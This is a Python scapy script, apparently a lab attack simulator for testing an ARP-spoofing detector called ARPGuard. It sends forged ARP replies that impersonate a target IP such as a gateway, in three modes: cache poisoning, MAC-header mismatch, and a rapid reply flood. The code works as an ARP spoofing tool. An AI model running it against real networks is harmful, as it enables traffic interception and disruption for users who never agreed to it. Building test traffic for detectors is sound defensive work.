import argparse
import os
import sys
import time
from scapy.all import ARP, Ether, sendp


def run_simulation(
    interface: str,
    target_ip: str,
    fake_mac: str,
    mode: str,
    count: int,
) -> None:
    print(f"[*] Starting '{mode}' simulation on interface '{interface}'...")

    if mode == "poison":
        # Standard ARP cache poisoning (impersonating target_ip with fake_mac)
        frame = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            psrc=target_ip,
            hwsrc=fake_mac,
            pdst="255.255.255.255",
            hwdst="ff:ff:ff:ff:ff:ff",
        )
        for i in range(1, count + 1):
            sendp(frame, iface=interface, verbose=False)
            print(
                f"  [+] Sent forged ARP reply #{i}/{count}: {target_ip} is-at {fake_mac}"
            )
            time.sleep(0.8)

    elif mode == "mismatch":
        # Ethernet frame source MAC differs from inner ARP payload sender MAC
        outer_mac = "02:11:22:33:44:55"
        frame = Ether(src=outer_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            psrc=target_ip,
            hwsrc=fake_mac,
            pdst="255.255.255.255",
            hwdst="ff:ff:ff:ff:ff:ff",
        )
        for i in range(1, count + 1):
            sendp(frame, iface=interface, verbose=False)
            print(
                f"  [+] Sent header-mismatched frame #{i}/{count}: Ether.src={outer_mac} != ARP.hwsrc={fake_mac}"
            )
            time.sleep(0.8)

    elif mode == "storm":
        # High-frequency unsolicited ARP flood (>25 replies within 5 seconds)
        frame = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            psrc=target_ip,
            hwsrc=fake_mac,
            pdst="255.255.255.255",
            hwdst="ff:ff:ff:ff:ff:ff",
        )
        burst = max(count, 30)
        print(f"  [!] Firing {burst} rapid ARP replies to trigger storm heuristic...")
        sendp(frame, iface=interface, count=burst, inter=0.03, verbose=False)
        print("  [+] Storm burst complete.")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print(
            "[!] Error: Simulator requires root privileges to inject raw frames. Run with sudo."
        )
        sys.exit(1)

    parser = argparse.ArgumentParser(description="ARPGuard Lab Attack Simulator")
    parser.add_argument(
        "-i",
        "--interface",
        required=True,
        help="Network interface (e.g., eth0, enp3s0)",
    )
    parser.add_argument(
        "-t",
        "--target-ip",
        required=True,
        help="IPv4 address to impersonate (e.g., gateway IP)",
    )
    parser.add_argument(
        "-f",
        "--fake-mac",
        default="08:00:27:de:ad:be",
        help="Spoofed attacker MAC address",
    )
    parser.add_argument(
        "--mode",
        choices=["poison", "mismatch", "storm"],
        default="poison",
        help="Attack heuristic to test (default: poison)",
    )
    parser.add_argument(
        "-c", "--count", type=int, default=5, help="Number of frames to transmit"
    )
    args = parser.parse_args()

    run_simulation(args.interface, args.target_ip, args.fake_mac, args.mode, args.count)
